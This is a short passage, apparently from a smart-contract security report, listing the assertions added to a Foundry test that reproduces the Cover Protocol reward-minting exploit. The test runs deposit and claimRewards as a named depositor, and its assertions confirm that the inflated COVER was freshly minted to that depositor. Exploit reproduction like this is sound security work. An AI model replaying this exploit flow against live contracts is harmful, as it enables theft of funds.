## 3. Assertions Added

All additive — no exploit-flow change:

```solidity
address depositor = 0x00007569643bc1709561ec2E86F385Df3759e5DD;

uint256 coverBefore = Cover.balanceOf(depositor);
uint256 coverTotalSupplyBefore = Cover.totalSupply();

cheat.prank(depositor);
bs.deposit(address(bpt), 15_255_552_810_089_260_015_361);
emit log_named_uint("Deposit BPT", 15_255_552_810_089_260_015_361);
cheat.prank(depositor);
bs.claimRewards(address(bpt));

uint256 coverAfter = Cover.balanceOf(depositor);
uint256 coverTotalSupplyAfter = Cover.totalSupply();

emit log_named_uint("After claimRewards, Cover Balance", coverAfter);

uint256 depositorDelta = coverAfter - coverBefore;
uint256 supplyDelta = coverTotalSupplyAfter - coverTotalSupplyBefore;

assertGt(depositorDelta, 1e18, "claimRewards must mint > 1 COVER (sanity floor)");
assertEq(supplyDelta, depositorDelta, "COVER totalSupply delta must equal depositor delta");
```

- **F1 floor (`assertGt depositorDelta > 1e18`):** depositor received
  more than 1 COVER from a single-block stake. A normal per-block
  emission share is far below this; the floor is conservative and does
  not encode a precise loss claim.
- **F6 mint-path equality (`assertEq supplyDelta == depositorDelta`):**
  totalSupply rose by exactly the depositor's delta. This proves the
  inflated reward routed through a fresh mint to the depositor and no
  other recipient — the canonical accounting-mismatch fingerprint.

Exploit flow (prank → deposit → prank → claimRewards) is byte-for-byte
unchanged. Only four read-only calls (`balanceOf` x2, `totalSupply` x2)
and two assertions were added.

inside the test, and not an assertion failure. Patch is retained as it
compiles cleanly and is logically correct against the unchanged
exploit path. Per the Phase 6 rule: classify as RPC limitation, not
